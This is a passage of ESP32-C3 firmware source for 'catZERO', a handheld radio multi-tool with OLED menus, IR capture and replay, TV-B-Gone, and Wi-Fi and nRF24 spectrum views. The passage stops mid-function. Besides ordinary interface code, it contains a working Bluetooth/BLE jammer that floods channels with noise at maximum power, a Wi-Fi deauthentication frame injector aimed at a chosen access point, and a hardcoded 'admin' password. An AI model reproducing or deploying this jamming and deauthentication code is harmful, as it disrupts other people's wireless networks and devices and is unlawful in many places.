/*
 * ============================================================================
 * catZERO v2.5 – АВТОПОДКЛЮЧЕНИЕ К WI-FI + ИКОНКА ВО ВСЕХ МЕНЮ
 * 
 * Аналоговые кнопки (GPIO0): UP, DOWN, OK.
 * 
 * ----------------------------------------------------------------------------
 * Версия:      2.5
 * Дата:        2025-03-10
 * Автор:       catZERO team
 * 
 * ПЕРВАЯ ЧАСТЬ (1100 строк) – все базовые определения, меню, консоль, админка.
 * ВТОРАЯ ЧАСТЬ (1300 строк) – остальные меню, updateDisplay, setup, loop.
 * ============================================================================
 */

// ----------------------------------------------------------------------------
// БИБЛИОТЕКИ
// ----------------------------------------------------------------------------
#include <EEPROM.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <RF24.h>
#include <IRrecv.h>
#include <IRsend.h>
#include <IRutils.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <vector>
#include <SD.h>

// ===== Function prototypes =====

void drawWifiConnecting();
void drawTvbgone();

void adminPanel();
void sdCardInfo();

void saveWiFiCredentials(String ssid, String password);
void loadWiFiCredentials();

void showBootLogo();
void initSDCard();

// ----------------------------------------------------------------------------
// НАСТРОЙКИ КОНСОЛИ И КОМАНД
// ----------------------------------------------------------------------------
#define CMD_INFO    "info"
#define CMD_DEV     "def"
#define CMD_CLEAR   "clear"
#define CMD_CS      "ch"
#define CMD_SFV     "ch w"
#define CMD_EXIT    "exit"
#define CMD_AP      "ap"
#define CMD_SD      "sd"

#define COMMAND_TIMEOUT_CS      -1
#define COMMAND_TIMEOUT_SFV     -1
#define DEV_MODE_TIMEOUT        -1
#define CONSOLE_AUTOREPEAT_DELAY  150
#define ADMIN_PASSWORD "admin"

// ----------------------------------------------------------------------------
// ПИНЫ ПОДКЛЮЧЕНИЯ ПЕРИФЕРИИ
// ----------------------------------------------------------------------------
#define BTN_ANALOG_PIN  0

#define SD_CS_PIN       20
#define SPI_MOSI        7
#define SPI_MISO        2
#define SPI_SCK         6

#define RF_CE_PIN       3
#define RF_CSN_PIN      4

#define IR_RX_PIN       5
#define IR_TX_PIN       21

#define OLED_SDA        8
#define OLED_SCL        9
#define SCREEN_WIDTH    128
#define SCREEN_HEIGHT   64
#define OLED_ADDR       0x3C
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

// ----------------------------------------------------------------------------
// ГЛОБАЛЬНЫЕ КОНСТАНТЫ
// ----------------------------------------------------------------------------
#define NRF_CHANNELS        80
#define WIFI_CHANNELS       14
#define IR_SLOTS_COUNT      4
#define IR_BUFFER_SIZE      512
#define EEPROM_SIZE_BYTES   1024
#define JAM_INTERVAL_MS     5
#define LONG_PRESS_MS       500
#define TVBGONE_CARRIER_HZ  38000
#define TVBGONE_CODE_GAP    200
#define WIFI_CONNECT_TIMEOUT_MS 15000

#define EEPROM_SSID_START   100
#define EEPROM_SSID_MAXLEN  32
#define EEPROM_PASS_START   132
#define EEPROM_PASS_MAXLEN  64

// ----------------------------------------------------------------------------
// КНОПКИ (АНАЛОГОВЫЕ)
// ----------------------------------------------------------------------------
enum Button { BTN_NONE, BTN_UP, BTN_DOWN, BTN_OK };
Button readButton() {
  int value = analogRead(BTN_ANALOG_PIN);
  if (value > 3800) return BTN_NONE;
  if (value > 2700 && value < 3400) return BTN_UP;
  if (value > 2000 && value < 2600) return BTN_OK;
  if (value > 1500 && value < 1950) return BTN_DOWN;
  return BTN_NONE;
}
bool btnUp()   { return readButton() == BTN_UP; }
bool btnDown() { return readButton() == BTN_DOWN; }
bool btnOk()   { return readButton() == BTN_OK; }

// ----------------------------------------------------------------------------
// ТАБЛИЦЫ КАНАЛОВ ДЛЯ ГЛУШЕНИЯ
// ----------------------------------------------------------------------------
const byte BLUETOOTH_CHANNELS[] = {
  0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,
  20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,
  38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,
  56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,
  74,75,76,77,78,79
};
const int BLUETOOTH_CHANNELS_COUNT = 80;
const byte BLE_CHANNELS[] = {
  0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,
  20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39
};
const int BLE_CHANNELS_COUNT = 40;

// ----------------------------------------------------------------------------
// СТРУКТУРЫ
// ----------------------------------------------------------------------------
struct WiFiNetworkInfo {
  String ssid; int rssi; int channel; uint8_t bssid[6]; String bssidString; String encryptionType;
};
struct IrSignalData {
  uint16_t rawBuffer[IR_BUFFER_SIZE]; uint16_t rawLength; String protocolName; bool isValid;
};
struct IrCode {
  uint8_t freq; uint8_t numpairs; uint8_t comp; const uint16_t *times; const uint8_t *codes;
};

// ----------------------------------------------------------------------------
// TV-B-Gone (пример)
// ----------------------------------------------------------------------------
const uint16_t sony_times[] = {240,600,1200,600};
const uint8_t sony_codes[] = {0x01,0x00,0x00,0x00};
const IrCode sony_code = {0x13,2,2,sony_times,sony_codes};
const IrCode* const NApowerCodes[] = {&sony_code};
const IrCode* const EUpowerCodes[] = {&sony_code};
const uint8_t num_NAcodes = 1, num_EUcodes = 1;

// Массив значка Wi-Fi (16x8)
const unsigned char wifiIconBitmap[] PROGMEM = {
  0b00000111, 0b11100000,
  0b00011000, 0b00011000,
  0b00100000, 0b00000100,
  0b00000111, 0b11100000,
  0b00011000, 0b00011000,
  0b00000000, 0b00000000,
  0b00000111, 0b11100000,
  0b00000001, 0b10000000
};

// ----------------------------------------------------------------------------
// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
// ----------------------------------------------------------------------------
int displayTimeoutSec = 30;
unsigned long lastActivityTime = 0;
bool displayOn = true, needRedraw = true;
unsigned long deviceBootTime = 0;
String statusMsg = "";
unsigned long statusMsgTime = 0;

std::vector<WiFiNetworkInfo> wifiList;
int wifiSelectedIdx = 0, wifiScrollOffset = 0;
bool wifiScanning = false;
int wifiPackets[WIFI_CHANNELS+1] = {0}, wifiSmooth[WIFI_CHANNELS+1] = {0};
int currentWifiChan = 1;
bool wifiSpectrumActive = false;
unsigned long totalPackets = 0, lastChanSwitch = 0;
uint8_t targetBSSID[6];
int targetChan = 0;
bool deauthActive = false;
unsigned long lastDeauthTime = 0;

RF24 radio(RF_CE_PIN, RF_CSN_PIN);
int nrfSmooth[NRF_CHANNELS], nrfRaw[NRF_CHANNELS], nrfFloor[NRF_CHANNELS];
int currentNrfChan = 0;
bool nrfOk = false, nrfCalibrated = false;
unsigned long lastNrfScan = 0;
String nrfErrorMsg = "";

enum BleJammerMode { BLE_JAMMER_OFF, BLE_JAMMER_MODE, BLUETOOTH_JAMMER_MODE };
BleJammerMode jammerMode = BLE_JAMMER_MODE;
bool jamming = false;
unsigned long lastJamTime = 0;

IRrecv* irRx = nullptr;
IRsend* irTx = nullptr;
IrSignalData irSlots[IR_SLOTS_COUNT];
int curIrSlot = 0, irTxScroll = 0;
bool irCapturing = false, irTempReady = false, irRxOk = false;
unsigned long irTimeout = 0;
uint16_t tempRaw[IR_BUFFER_SIZE];
uint16_t tempRawLen = 0;
String tempProto;
decode_results irResult;

// ----------------------------------------------------------------------------
// СОСТОЯНИЯ ПРИЛОЖЕНИЯ
// ----------------------------------------------------------------------------
enum AppState {
  STATE_MAIN_MENU, STATE_WIFI_MENU, STATE_WIFI_SCAN, STATE_WIFI_SPECTRUM,
  STATE_WIFI_ACTIONS, STATE_WIFI_INFO, STATE_NRF24_MENU, STATE_NRF24_SPECTRUM,
  STATE_NRF24_JAMMER, STATE_IR_MENU, STATE_IR_CAPTURE, STATE_IR_TRANSMIT,
  STATE_IR_ERASE, STATE_TVBGONE, STATE_SETTINGS_MENU, STATE_SYSTEM_INFO,
  STATE_TIMEOUT, STATE_RESET_CONFIRM, STATE_REBOOT_CONFIRM, STATE_CONSOLE,
  STATE_CONSOLE_COMMAND_OUTPUT, STATE_WIFI_CONNECTING
};
AppState appState = STATE_MAIN_MENU;

int mainIdx=0, wifiMenuIdx=0, nrfMenuIdx=0, irMenuIdx=0, settingsIdx=0, wifiActionIdx=0, timeoutVal=30;
const int MAIN_SIZE=5, WIFI_MENU_SIZE=3, NRF_MENU_SIZE=4, IR_MENU_SIZE=5, SETTINGS_SIZE=5, WIFI_ACTIONS_SIZE=5;
unsigned long okPressStart=0;
bool longPressDetected=false;
uint8_t tvbgone_region=0;

// ----------------------------------------------------------------------------
// КОНСОЛЬ
// ----------------------------------------------------------------------------
enum ConsoleMode { CONSOLE_KEYBOARD, CONSOLE_INFO, CONSOLE_DEV };
ConsoleMode consoleMode = CONSOLE_KEYBOARD;
bool capsLock = false;
String consoleText = "";

String lowerKeys[] = {
  "a","b","c","d","e","f","g","h",
  "i","j","k","l","m","n","o","p",
  "q","r","s","t","u","v","w","x",
  "y","z","1","2","3","4","5","6",
  "7","8","9","0","Space","Caps","Del","OK",
  "Exit","","","","","","",""
};
String upperKeys[] = {
  "A","B","C","D","E","F","G","H",
  "I","J","K","L","M","N","O","P",
  "Q","R","S","T","U","V","W","X",
  "Y","Z","!","@","#","$","%","&",
  "*","(",")","0","Space","Caps","Del","OK",
  "Exit","","","","","","",""
};
int selectedKey = 0;
const int totalKeys = 48, rowsKeyboard = 6, colsKeyboard = 8;

String infoLines[] = {
  "CPU: ESP32-C3", "Flash:" + String(ESP.getFlashChipSize()/1048576) + "MB",
  "Heap:" + String(ESP.getFreeHeap()/1024) + "KB", "Chip Rev:" + String(ESP.getChipRevision()),
  "Freq:" + String(ESP.getCpuFreqMHz()) + "MHz", "Uptime:" + String(millis()/1000) + "s"
};
int infoPage=0, totalInfo=6;

int secretCode[] = {1,2,3,1,2,3,1,2,3};
int enteredCode[9];
int codePos=0;

String commandOutput = "";
unsigned long commandStartTime = 0;
int commandTimeoutSec = 0;
bool waitingForOk = false;
bool adminMode = false;
String adminPassword = ADMIN_PASSWORD;
int displayBrightness = 128;
bool displayInvert = false;
int irBufferSize = 512;

// ----------------------------------------------------------------------------
// Wi-Fi CONNECT И СОХРАНЕНИЕ
// ----------------------------------------------------------------------------
String connectSsid = "", connectPassword = "";
bool connectInProgress = false;
unsigned long connectStartTime = 0;
String savedSSID = "", savedPassword = "";
bool wifiAutoConnectAttempted = false;

// ----------------------------------------------------------------------------
// БАЗОВЫЕ ФУНКЦИИ ДЛЯ РАБОТЫ С EEPROM
// ----------------------------------------------------------------------------
void saveTimeout() {
  EEPROM.begin(EEPROM_SIZE_BYTES);
  EEPROM.write(0, displayTimeoutSec);
  EEPROM.commit();
  EEPROM.end();
}
void loadTimeout() {
  EEPROM.begin(EEPROM_SIZE_BYTES);
  displayTimeoutSec = EEPROM.read(0);
  if (displayTimeoutSec == 255 || displayTimeoutSec == 0) displayTimeoutSec = 30;
  EEPROM.end();
}
void saveWiFiCredentials(String ssid, String password) {
  EEPROM.begin(EEPROM_SIZE_BYTES);
  for (int i = 0; i < EEPROM_SSID_MAXLEN && i < ssid.length(); i++) {
    EEPROM.write(EEPROM_SSID_START + i, ssid[i]);
  }
  EEPROM.write(EEPROM_SSID_START + EEPROM_SSID_MAXLEN - 1, '\0');
  for (int i = 0; i < EEPROM_PASS_MAXLEN && i < password.length(); i++) {
    EEPROM.write(EEPROM_PASS_START + i, password[i]);
  }
  EEPROM.write(EEPROM_PASS_START + EEPROM_PASS_MAXLEN - 1, '\0');
  EEPROM.commit();
  EEPROM.end();
}
void loadWiFiCredentials() {
  EEPROM.begin(EEPROM_SIZE_BYTES);
  char ssidBuf[EEPROM_SSID_MAXLEN];
  char passBuf[EEPROM_PASS_MAXLEN];
  for (int i = 0; i < EEPROM_SSID_MAXLEN; i++) {
    ssidBuf[i] = EEPROM.read(EEPROM_SSID_START + i);
    if (ssidBuf[i] == '\0') break;
  }
  ssidBuf[EEPROM_SSID_MAXLEN - 1] = '\0';
  for (int i = 0; i < EEPROM_PASS_MAXLEN; i++) {
    passBuf[i] = EEPROM.read(EEPROM_PASS_START + i);
    if (passBuf[i] == '\0') break;
  }
  passBuf[EEPROM_PASS_MAXLEN - 1] = '\0';
  savedSSID = String(ssidBuf);
  savedPassword = String(passBuf);
  EEPROM.end();
}
void setPower(bool on) {
  if (on == displayOn) return;
  displayOn = on;
  if (on) display.ssd1306_command(SSD1306_DISPLAYON);
  else display.ssd1306_command(SSD1306_DISPLAYOFF);
}
void showMsg(const char* msg) {
  statusMsg = msg;
  statusMsgTime = millis();
  needRedraw = true;
}

// ----------------------------------------------------------------------------
// IR: СОХРАНЕНИЕ/ЗАГРУЗКА СЛОТОВ
// ----------------------------------------------------------------------------
void saveIrSlots() {
  EEPROM.begin(EEPROM_SIZE_BYTES);
  int address = 100;
  for (int i = 0; i < IR_SLOTS_COUNT; i++) {
    EEPROM.write(address++, irSlots[i].isValid ? 1 : 0);
    if (irSlots[i].isValid) {
      EEPROM.put(address, irSlots[i].rawLength);
      address += 2;
      EEPROM.put(address, irSlots[i].rawBuffer);
      address += irSlots[i].rawLength * 2;
    }
  }
  EEPROM.commit();
  EEPROM.end();
}
void loadIrSlots() {
  EEPROM.begin(EEPROM_SIZE_BYTES);
  int address = 100;
  for (int i = 0; i < IR_SLOTS_COUNT; i++) {
    uint8_t v = EEPROM.read(address++);
    irSlots[i].isValid = (v == 1);
    if (irSlots[i].isValid) {
      EEPROM.get(address, irSlots[i].rawLength);
      address += 2;
      EEPROM.get(address, irSlots[i].rawBuffer);
      address += irSlots[i].rawLength * 2;
    }
  }
  EEPROM.end();
}
void eraseAllIrSlots() {
  for (int i = 0; i < IR_SLOTS_COUNT; i++) irSlots[i].isValid = false;
  saveIrSlots();
  showMsg("All IR slots erased");
}
void processIrCapture() {
  if (millis() > irTimeout) {
    irCapturing = false;
    needRedraw = true;
    return;
  }
  if (irRx && irRx->decode(&irResult)) {
    tempRawLen = irResult.rawlen;
    if (tempRawLen > IR_BUFFER_SIZE) tempRawLen = IR_BUFFER_SIZE;
    for (int i = 0; i < tempRawLen; i++) tempRaw[i] = irResult.rawbuf[i] * 50;
    tempProto = String(typeToString(irResult.decode_type, irResult.repeat));
    irTempReady = true;
    irRx->resume();
    needRedraw = true;
  }
}
void sendIr(int slot) {
  if (!irSlots[slot].isValid) return;
  if (irTx && irRxOk) {
    irTx->sendRaw(irSlots[slot].rawBuffer, irSlots[slot].rawLength, 38);
    delay(50);
  }
}

// ----------------------------------------------------------------------------
// nRF24
// ----------------------------------------------------------------------------
void recheckNRF24() {
  SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, RF_CSN_PIN);
  SPI.setFrequency(8000000);
  if (radio.begin(RF_CE_PIN, RF_CSN_PIN) && radio.isChipConnected()) {
    nrfOk = true;
    nrfErrorMsg = "OK";
    radio.setChannel(42);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setAutoAck(false);
    radio.disableCRC();
    radio.stopListening();
    showMsg("nRF24 OK");
  } else {
    nrfOk = false;
    nrfErrorMsg = "not found";
    showMsg("nRF24 not found");
  }
  needRedraw = true;
}
void startJammer() {
  if (!nrfOk) { showMsg(nrfErrorMsg.c_str()); return; }
  jamming = true;
  lastJamTime = millis();
  radio.powerUp();
  radio.stopListening();
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false);
  radio.disableCRC();
  if (jammerMode == BLE_JAMMER_MODE) showMsg("BLE Jammer ON");
  else showMsg("BT Jammer ON");
}
void stopJammer() {
  jamming = false;
  radio.powerDown();
  showMsg("Jammer OFF");
}
void updateJammer() {
  if (!jamming) return;
  const char noise[] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
  if (jammerMode == BLE_JAMMER_MODE) {
    for (int i = 0; i < BLE_CHANNELS_COUNT; i++) {
      radio.setChannel(BLE_CHANNELS[i]);
      radio.write(&noise, sizeof(noise));
    }
  } else {
    for (int i = 0; i < BLUETOOTH_CHANNELS_COUNT; i++) {
      radio.setChannel(BLUETOOTH_CHANNELS[i]);
      radio.write(&noise, sizeof(noise));
    }
  }
}
void updateNrfSpectrum() {
  if (!nrfOk) return;
  if (millis() - lastNrfScan < 10) return;
  lastNrfScan = millis();
  if (!nrfCalibrated) {
    for (int ch = 0; ch < NRF_CHANNELS; ch++) {
      int minRssi = 100;
      for (int m = 0; m < 10; m++) {
        radio.setChannel(ch);
        radio.startListening();
        delayMicroseconds(150);
        int rssi = radio.testCarrier() ? 40 : 15;
        radio.stopListening();
        if (rssi < minRssi) minRssi = rssi;
      }
      nrfFloor[ch] = minRssi;
    }
    nrfCalibrated = true;
    memset(nrfSmooth, 0, sizeof(nrfSmooth));
    needRedraw = true;
    return;
  }
  radio.setChannel(currentNrfChan);
  radio.startListening();
  delayMicroseconds(150);
  int raw = radio.testCarrier() ? 40 : 0;
  raw -= nrfFloor[currentNrfChan];
  if (raw < 0) raw = 0;
  if (raw > 50) raw = 50;
  nrfRaw[currentNrfChan] = raw;
  int recent[5], cnt = 0;
  for (int i = 0; i < 5; i++) {
    int idx = (currentNrfChan - i + NRF_CHANNELS) % NRF_CHANNELS;
    if (nrfRaw[idx] > 0 || i == 0) recent[cnt++] = nrfRaw[idx];
  }
  for (int i = 0; i < cnt - 1; i++)
    for (int j = i + 1; j < cnt; j++)
      if (recent[i] > recent[j]) { int t = recent[i]; recent[i] = recent[j]; recent[j] = t; }
  int filtered = recent[cnt / 2];
  nrfSmooth[currentNrfChan] = (nrfSmooth[currentNrfChan] * 7 + filtered * 3) / 10;
  currentNrfChan = (currentNrfChan + 1) % NRF_CHANNELS;
  needRedraw = true;
}

// ----------------------------------------------------------------------------
// Wi-Fi: сканирование, спектр, деаут, подключение
// ----------------------------------------------------------------------------
void startWifiScan()
{
    wifiScanning = true;

    wifiList.clear();

    wifiSelectedIdx = 0;
    wifiScrollOffset = 0;

    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(20,28);
    display.print("Scanning...");
    display.display();

    Serial.println("Scanning WiFi...");

    // Полный сброс WiFi
    WiFi.disconnect(true, true);
    delay(500);

    WiFi.mode(WIFI_STA);
    WiFi.setSleep(false);

    delay(500);

    int found = WiFi.scanNetworks();

    Serial.print("Found: ");
    Serial.println(found);

    if(found <= 0)
    {
        Serial.println("No networks");

        showMsg("No WiFi found");

        wifiScanning = false;
        return;
    }

    for(int i=0; i<found && i<50; i++)
    {
        WiFiNetworkInfo net;

        net.ssid = WiFi.SSID(i);

        if(net.ssid=="")
            net.ssid="Hidden";

        net.rssi = WiFi.RSSI(i);

        net.channel = WiFi.channel(i);

        uint8_t* bssid = WiFi.BSSID(i);

        memcpy(net.bssid,bssid,6);

        wifiList.push_back(net);

        Serial.print(i+1);
        Serial.print(" ");

        Serial.print(net.ssid);

        Serial.print(" RSSI:");

        Serial.println(net.rssi);
    }

    WiFi.scanDelete();

    wifiScanning = false;

    wifiSelectedIdx = 0;
    wifiScrollOffset = 0;

    needRedraw = true;
}
void updateWifiSpectrum() {
  if (!wifiSpectrumActive) return;
  if (millis() - lastChanSwitch > 100) {
    currentWifiChan = (currentWifiChan % WIFI_CHANNELS) + 1;
    esp_wifi_set_channel(currentWifiChan, WIFI_SECOND_CHAN_NONE);
    lastChanSwitch = millis();
    wifiPackets[currentWifiChan] = 0;
    needRedraw = true;
  }
  for (int ch = 1; ch <= WIFI_CHANNELS; ch++)
    wifiSmooth[ch] = (wifiSmooth[ch] * 7 + wifiPackets[ch] * 3) / 10;
}
void sendDeauth() {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_channel(targetChan, WIFI_SECOND_CHAN_NONE);
  uint8_t deauth[26] = {
    0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    targetBSSID[0],targetBSSID[1],targetBSSID[2],targetBSSID[3],targetBSSID[4],targetBSSID[5],
    targetBSSID[0],targetBSSID[1],targetBSSID[2],targetBSSID[3],targetBSSID[4],targetBSSID[5],
    0x00,0x00,0x07,0x00
  };
  uint8_t mac[6];
  esp_read_mac(mac, ESP_MAC_WIFI_STA);
  for (int i = 0; i < 6; i++) deauth[10 + i] = mac[i];
  esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
}
bool connectToWiFi(String ssid, String password)
{
    WiFi.disconnect(true);
    delay(500);

    WiFi.begin(ssid.c_str(), password.c_str());

    unsigned long startTime = millis();

    int dots = 0;

    while (millis() - startTime < 60000) // 60 секунд
    {
        // Если подключился
        if (WiFi.status() == WL_CONNECTED)
        {
            display.clearDisplay();

            display.setTextSize(1);
            display.setCursor(15,25);
            display.println("Connected!");

            display.display();

            delay(1500);

            return true;
        }

        // экран загрузки
        display.clearDisplay();

        display.setTextSize(1);
        display.setCursor(25,20);
        display.print("Connect");

        // рисуем точки
        for(int i=0;i<dots;i++)
        {
            display.print(".");
        }

        display.display();

        dots++;

        if(dots>3)
        {
            dots=0;
        }

        delay(500);
    }

    // если прошло 60 сек
    display.clearDisplay();

    display.setTextSize(1);
    display.setCursor(20,25);
    display.println("Wrong password");

    display.display();

    delay(2000);

    WiFi.disconnect();

    return false;
}
void attemptAutoConnect() {
  loadWiFiCredentials();
  if (savedSSID.length() > 0 && savedPassword.length() > 0) {
    showMsg("Auto-connecting...");
    WiFi.disconnect(true); delay(100);
    WiFi.mode(WIFI_STA);
    WiFi.begin(savedSSID.c_str(), savedPassword.c_str());
    unsigned long start = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
      delay(200);
    }
    if (WiFi.status() == WL_CONNECTED) {
      String msg = "Auto-connected to " + savedSSID;
      showMsg(msg.c_str());
    } else {
      showMsg("Auto-connect failed");
    }
  }
}

// ----------------------------------------------------------------------------
// TV-B-Gone
// ----------------------------------------------------------------------------
void tvbgone_send_all(const IrCode* const* codes, uint8_t num_codes) {
  ledcSetup(0, TVBGONE_CARRIER_HZ, 8);
  ledcAttachPin(IR_TX_PIN, 0);
  ledcWrite(0, 0);
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(10, 10);
  display.print("Sending IR codes...");
  display.setCursor(10, 25);
  display.print("Region: ");
  if (tvbgone_region == 0) display.print("NA");
  else display.print("EU");
  display.drawRect(10, 45, 108, 8, SSD1306_WHITE);
  display.display();
  unsigned long startTime = millis();
  unsigned long nextProgressTime = startTime + 1000;
  for (uint8_t idx = 0; idx < num_codes; idx++) {
    const IrCode* code = codes[idx];
    uint8_t numPairs = code->numpairs;
    uint8_t bitComp = code->comp;
    const uint16_t* timePtr = code->times;
    const uint8_t* codePtr = code->codes;
    uint16_t pairs[256];
    uint16_t pCnt = 0;
    uint8_t bits = 0, bitsLeft = 0;
    for (uint8_t k = 0; k < numPairs; k++) {
      uint8_t idxTime = 0;
      for (uint8_t b = 0; b < bitComp; b++) {
        if (bitsLeft == 0) {
          bits = *codePtr++;
          bitsLeft = 8;
        }
        bitsLeft--;
        idxTime = (idxTime << 1) | ((bits >> bitsLeft) & 1);
      }
      uint16_t onTime = timePtr[idxTime * 4];
      uint16_t offTime = timePtr[idxTime * 4 + 2];
      pairs[pCnt++] = onTime;
      pairs[pCnt++] = offTime;
    }
    for (uint16_t i = 0; i < pCnt; i += 2) {
      ledcWrite(0, 128);
      delayMicroseconds(pairs[i] * 10);
      ledcWrite(0, 0);
      delayMicroseconds(pairs[i + 1] * 10);
      yield();
    }
    unsigned long now = millis();
    if (now >= nextProgressTime) {
      int realPercent = (idx + 1) * 100 / num_codes;
      int elapsedSeconds = (now - startTime) / 1000;
      if (elapsedSeconds > 100) elapsedSeconds = 100;
      int displayPercent = (realPercent < elapsedSeconds) ? realPercent : elapsedSeconds;
      display.fillRect(11, 46, (displayPercent * 108) / 100, 6, SSD1306_WHITE);
      display.setCursor(55, 35);
      display.print(displayPercent);
      display.print("%");
      display.display();
      nextProgressTime = now + 1000;
    }
    delay(TVBGONE_CODE_GAP);
  }
  display.fillRect(11, 46, 108, 6, SSD1306_WHITE);
  display.setCursor(55, 35);
  display.print("100%");
  display.display();
  ledcDetachPin(IR_TX_PIN);
  ledcWrite(0, 0);
  showMsg("Done");
}
void tvbgone_menu() {
  tvbgone_region = 0;
  while (true) {
    drawTvbgone();
    bool up = btnUp();
    bool down = btnDown();
    bool ok = btnOk() && !longPressDetected;
    if (up || down) {
      tvbgone_region = !tvbgone_region;
      delay(200);
    }
    if (ok) {
      EEPROM.begin(EEPROM_SIZE_BYTES);
      EEPROM.write(1, tvbgone_region);
      EEPROM.commit();
      EEPROM.end();
      if (tvbgone_region == 0) tvbgone_send_all(NApowerCodes, num_NAcodes);
      else tvbgone_send_all(EUpowerCodes, num_EUcodes);
      showMsg("Done!");
      break;
    }
    delay(50);
  }
  appState = STATE_IR_MENU;
  needRedraw = true;
}

// ----------------------------------------------------------------------------
// ЗАСТАВКА И ИНИЦИАЛИЗАЦИЯ SD
// ----------------------------------------------------------------------------
const char* bootLogo[] = {
  " ####   ##   #####",
  "##  ## ####    ## ",
  "##    ##  ##   ## ",
  "##  ########   ## ",
  " ######    ##  ## "
};
void showBootLogo() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  for (int i = 0; i < 5; i++) {
    display.setCursor(5, 5 + i * 8);
    display.println(bootLogo[i]);
    display.display();
    delay(120);
  }
  display.setCursor(42, 52);
  display.println("ZERO");
  display.display();
  delay(1000);
  display.clearDisplay();
  display.setTextSize(2);
  display.setCursor(15, 25);
  display.println("catZERO");
  display.display();
  delay(1000);
  display.setTextSize(1);
}
void initSDCard() {
  SPI.begin(SPI_SCK, SPI_MISO, SPI_MOSI, SD_CS_PIN);
  if (!SD.begin(SD_CS_PIN)) {
    display.clearDisplay();
    display.setCursor(10, 28);
    display.println("SD Card failed!");
    display.display();
    delay(2000);
    return;
  }
  uint8_t cardType = SD.cardType();
  uint64_t cardSize = SD.cardSize() / (1024 * 1024);
  uint64_t freeSpace = (SD.totalBytes() - SD.usedBytes()) / (1024 * 1024);
  display.clearDisplay();
  display.setCursor(10, 10);
  display.println("SD Card OK");
  display.setCursor(10, 25);
  display.print("Type: ");
  if (cardType == CARD_MMC) display.print("MMC");
  else if (cardType == CARD_SD) display.print("SDSC");
  else if (cardType == CARD_SDHC) display.print("SDHC");
  else display.print("Unknown");
  display.setCursor(10, 40);
  display.print("Size: "); display.print(cardSize); display.println(" MB");
  display.setCursor(10, 55);
  display.print("Free: "); display.print(freeSpace); display.println(" MB");
  display.display();
  delay(3000);
}

// ----------------------------------------------------------------------------
// ФУНКЦИИ ОТРИСОВКИ (ОСНОВНЫЕ МЕНЮ)
// ----------------------------------------------------------------------------
void drawHeader(const char* title) {
  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_BLACK);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(2, 3);
  display.print(title);
  display.setTextColor(SSD1306_WHITE);
  display.drawLine(0, 12, SCREEN_WIDTH, 12, SSD1306_WHITE);
}
void drawItem(const char* text, bool sel, int line) {
  int y = 14 + line * 10;
  if (sel) {
    display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(4, y);
    display.print(">");
  } else display.setTextColor(SSD1306_WHITE);
  display.setCursor(14, y);
  display.print(text);
}
void drawWiFiIcon(int x, int y) {
  display.fillRect(x, y, 16, 8, SSD1306_BLACK);
  display.drawBitmap(x, y, wifiIconBitmap, 16, 8, SSD1306_WHITE);
}
void drawTopBarWiFiIcon() {
  if (WiFi.status() == WL_CONNECTED) {
    drawWiFiIcon(SCREEN_WIDTH - 16, 2);
  }
}
void drawMainMenu() {
  display.clearDisplay();
  drawHeader("catZERO");
  const char* items[] = {"WiFi", "nRF24", "IR", "Console", "Settings"};
  for (int i = 0; i < MAIN_SIZE; i++) drawItem(items[i], i == mainIdx, i);
  drawTopBarWiFiIcon();
  display.display();
}
void drawWifiMenu() {
  display.clearDisplay();
  drawHeader("WiFi");
  const char* items[] = {"Scan", "Spectrum", "Back"};
  for (int i = 0; i < WIFI_MENU_SIZE; i++) drawItem(items[i], i == wifiMenuIdx, i);
  drawTopBarWiFiIcon();
  display.display();
}
void drawWifiScan() {
  display.clearDisplay();
  drawHeader("WiFi Scan");
  if (wifiScanning) display.setCursor(40,30), display.println("Scanning...");
  else if (wifiList.empty()) display.setCursor(30,30), display.println("No networks");
  else {
    int visible = 4;
    if (wifiSelectedIdx < wifiScrollOffset) wifiScrollOffset = wifiSelectedIdx;
    if (wifiSelectedIdx >= wifiScrollOffset + visible) wifiScrollOffset = wifiSelectedIdx - visible + 1;
    if (wifiScrollOffset < 0) wifiScrollOffset = 0;
    if (wifiScrollOffset + visible > (int)wifiList.size()) wifiScrollOffset = wifiList.size() - visible;
    for (int i = 0; i < visible && wifiScrollOffset + i < (int)wifiList.size(); i++) {
      int idx = wifiScrollOffset + i;
      int y = 14 + i * 12;
      if (wifiSelectedIdx == idx) {
        display.fillRect(0, y - 1, SCREEN_WIDTH, 11, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
        display.setCursor(2, y);
        display.print(">");
      } else display.setTextColor(SSD1306_WHITE);
      display.setCursor(12, y);
      String line = wifiList[idx].ssid.substring(0,10) + " " + String(wifiList[idx].rssi);
      display.print(line);
    }
    int yb = 14 + visible * 12;
    if (wifiSelectedIdx == -1) {
      display.fillRect(0, yb - 1, SCREEN_WIDTH, 11, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(2, yb);
